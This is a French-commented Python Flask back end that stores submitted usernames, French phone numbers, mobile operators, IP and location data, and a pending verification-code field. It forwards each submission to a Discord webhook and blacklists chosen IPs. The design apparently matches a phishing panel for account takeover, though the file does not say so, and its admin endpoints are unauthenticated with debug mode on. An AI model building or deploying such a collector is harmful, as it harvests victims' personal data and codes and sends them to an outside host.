from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
import sqlite3
import os
import uuid
from datetime import datetime
import requests
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__, static_folder='../public')
CORS(app)

# ============================================================
# BASE DE DONNÉES SQLITE
# ============================================================
DB_PATH = os.path.join(os.path.dirname(__file__), 'database.db')

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS submissions (
            id TEXT PRIMARY KEY,
            username TEXT,
            phone TEXT,
            operator TEXT,
            ip TEXT,
            country TEXT,
            city TEXT,
            browser TEXT,
            device TEXT,
            code TEXT,
            status TEXT,
            created_at TEXT
        )
    ''')
    c.execute('''
        CREATE TABLE IF NOT EXISTS blacklist (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ip TEXT UNIQUE,
            created_at TEXT
        )
    ''')
    conn.commit()
    conn.close()
    print('✅ Base de données initialisée')

# ============================================================
# ROUTES API
# ============================================================
@app.route('/')
def index():
    return send_from_directory('../public', 'index.html')

@app.route('/api/submit', methods=['POST'])
def submit():
    data = request.json
    username = data.get('username')
    phone = data.get('phone')
    operator = data.get('operator')
    ip = data.get('ip', 'Inconnue')
    country = data.get('country', 'France')
    city = data.get('city', 'Inconnue')
    browser = data.get('browser', 'Inconnu')
    device = data.get('device', 'Inconnu')
    
    # Vérifier la blacklist
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('SELECT * FROM blacklist WHERE ip = ?', (ip,))
    if c.fetchone():
        conn.close()
        return jsonify({'error': 'IP blacklistée'}), 403
    
    submission_id = str(uuid.uuid4())[:8]
    created_at = datetime.now().isoformat()
    
    c.execute('''
        INSERT INTO submissions 
        (id, username, phone, operator, ip, country, city, browser, device, status, created_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    ''', (submission_id, username, phone, operator, ip, country, city, browser, device, 'pending', created_at))
    conn.commit()
    conn.close()
    
    # Envoyer au webhook Discord
    webhook_url = os.getenv('DISCORD_WEBHOOK_URL')
    if webhook_url:
        try:
            message = f"🔑 **Nouvelle soumission**\n👻 @{username}\n📡 {operator}\n📞 +33{phone}\n🕵️ IP: {ip}\n🌍 {country} - {city}\n📦 ID: {submission_id}"
            requests.post(webhook_url, json={'content': message})
        except:
            pass
    
    return jsonify({'success': True, 'id': submission_id})

@app.route('/api/submissions', methods=['GET'])
def get_submissions():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('SELECT * FROM submissions ORDER BY created_at DESC LIMIT 50')
    rows = c.fetchall()
    conn.close()
    
    submissions = []
    for row in rows:
        submissions.append({
            'id': row[0],
            'username': row[1],
            'phone': row[2],
            'operator': row[3],
            'ip': row[4],
            'country': row[5],
            'city': row[6],
            'browser': row[7],
            'device': row[8],
            'code': row[9],
            'status': row[10],
            'created_at': row[11]
        })
    
    return jsonify(submissions)

@app.route('/api/submissions/<submission_id>', methods=['GET'])
def get_submission(submission_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('SELECT * FROM submissions WHERE id = ?', (submission_id,))
    row = c.fetchone()
    conn.close()
    
    if not row:
        return jsonify({'error': 'Not found'}), 404
    
    return jsonify({
        'id': row[0],
        'username': row[1],
        'phone': row[2],
        'operator': row[3],
        'ip': row[4],
        'country': row[5],
        'city': row[6],
        'browser': row[7],
        'device': row[8],
        'code': row[9],
        'status': row[10],
        'created_at': row[11]
    })

@app.route('/api/blacklist', methods=['POST'])
def add_blacklist():
    data = request.json
    ip = data.get('ip')
    if not ip:
        return jsonify({'error': 'IP requise'}), 400
    
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('INSERT OR IGNORE INTO blacklist (ip, created_at) VALUES (?, ?)', 
              (ip, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    
    return jsonify({'success': True})

@app.route('/api/blacklist', methods=['GET'])
def get_blacklist():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('SELECT ip, created_at FROM blacklist')
    rows = c.fetchall()
    conn.close()
    
    return jsonify([{'ip': row[0], 'created_at': row[1]} for row in rows])

if __name__ == '__main__':
    # 🔥 INITIALISATION DE LA BASE (CORRIGÉE)
    init_db()
    app.run(host='0.0.0.0', port=3000, debug=True)